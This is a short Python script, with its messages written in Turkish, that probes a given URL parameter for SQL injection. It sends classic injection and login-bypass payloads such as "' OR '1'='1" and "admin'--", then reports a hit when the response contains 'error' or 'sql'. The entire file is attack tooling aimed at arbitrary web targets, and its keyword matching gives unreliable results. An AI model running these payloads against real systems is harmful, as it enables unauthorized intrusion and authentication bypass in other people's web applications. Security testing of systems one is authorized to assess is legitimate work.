#!/usr/bin/env python3
import requests
import sys

def test_sqli(url, param):
    payloads = ["'", '"', "' OR '1'='1", "'--", "admin'--"]
    print(f"\n[*] Hedef: {url}")
    print(f"[*] Parametre: {param}\n")
    for p in payloads:
        target = f"{url}?{param}={p}"
        try:
            r = requests.get(target, timeout=5)
            if "error" in r.text.lower() or "sql" in r.text.lower():
                print(f"[!] Potansiyel SQLi bulundu: {p}")
                return
        except:
            pass
    print("[*] SQLi bulunamadı.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Kullanım: {sys.argv[0]} <url> <parametre>")
        sys.exit(1)
    test_sqli(sys.argv[1], sys.argv[2])
